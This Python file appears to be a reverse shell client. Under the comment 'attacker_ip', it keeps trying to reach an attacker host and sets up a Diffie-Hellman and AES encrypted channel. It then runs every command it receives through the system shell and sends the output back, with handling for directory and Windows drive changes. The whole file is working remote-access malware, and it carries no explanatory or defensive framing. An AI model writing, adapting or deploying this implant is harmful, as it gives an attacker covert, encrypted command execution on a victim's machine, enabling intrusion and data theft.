import socket
import subprocess
import time
import os


# AES and DH

from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Hash import SHA256
from Crypto.Util.Padding import pad, unpad
from Crypto.PublicKey import RSA
import random

PRIME = 2**2048 - 159
GENERATOR = 2

class DiffieHellmanChannel:
    def __init__(self):
        self.private = random.randint(2, PRIME - 2)
        self.public = pow(GENERATOR, self.private, PRIME)
        self.shared_key = None

    def generate_shared_key(self, other_public):
        shared_secret = pow(other_public, self.private, PRIME)
        sha = SHA256.new()
        sha.update(str(shared_secret).encode())
        self.shared_key = sha.digest()[:16]

    def encrypt(self, message):
        if isinstance(message, str):
            message_bytes = message.encode()
        elif isinstance(message, bytes):
            message_bytes = message
        else:
            raise TypeError("Message must be a string or bytes")

        padded_message = pad(message_bytes, AES.block_size)
        iv = get_random_bytes(AES.block_size)

        cipher = AES.new(self.shared_key, AES.MODE_CBC, iv)
        encrypted_message = cipher.encrypt(padded_message)
        return iv + encrypted_message  # Return the IV concatenated with the encrypted message


    def decrypt(self, encrypted_message):
        if not encrypted_message:
            raise ValueError("Empty message received")
        if len(encrypted_message) < AES.block_size * 2:
            raise ValueError(f"Encrypted message is too short ({len(encrypted_message)} bytes). IV or ciphertext might be missing.")

        iv = encrypted_message[:AES.block_size]
        ciphertext = encrypted_message[AES.block_size:]

        cipher = AES.new(self.shared_key, AES.MODE_CBC, iv)
        decrypted_message = unpad(cipher.decrypt(ciphertext), AES.block_size)
        return decrypted_message.decode(errors="ignore")


#Script

attacker_ip = 'localhost'
port = 87

while True:
    try:
        print("Trying to connect...")
        s = socket.socket()
        s.settimeout(3)
        s.connect((attacker_ip, port))
        s.settimeout(None)
        print("Connected to attacker.")
        secure = DiffieHellmanChannel()
        server_pub = int(s.recv(4096).decode())
        s.send(str(secure.public).encode())
        secure.generate_shared_key(server_pub)

        while True:
            try:
                validation = s.recv(1024)
                if not validation:
                    break
                validation = secure.decrypt(validation).strip()

                cwd = os.getcwd()
                s.send(secure.encrypt(cwd))

                command = s.recv(1024)
                decrypted = secure.decrypt(command)
                print(decrypted)
                if decrypted.lower() == "exit":
                    print("[+] Exit command received. Closing connection.")
                    s.close()
                    break

                if decrypted.lower().startswith("cd "):
                    try:
                        path = decrypted[3:].strip()
                        os.chdir(path)
                        output = f"Changed directory to {os.getcwd()}"
                    except Exception as e:
                        output = str(e)

                elif len(decrypted.strip()) == 2 and decrypted[1] == ':' and decrypted[0].isalpha():
                    try:
                        os.chdir(decrypted.strip() + "\\")
                        output = f"Changed drive to {os.getcwd()}"
                    except Exception as e:
                        output = str(e)

                else:
                    try:
                        output = subprocess.check_output(decrypted, shell=True, stderr=subprocess.STDOUT)
                    except subprocess.CalledProcessError as e:
                        output = e.output
                    except Exception as e:
                        output = str(e)

                chunk_size = 1024
                for i in range(0, len(output), chunk_size):
                    s.send(secure.encrypt(output[i:i + chunk_size]))

                s.send(secure.encrypt(b"<EOF>"))

            except Exception as e:
                print(f"[-] Error during command execution: {e}")
                break

    except Exception as e:
        print(f"Connection failed: {e}")
        try:
            s.close()
        except:
            pass
        time.sleep(5)
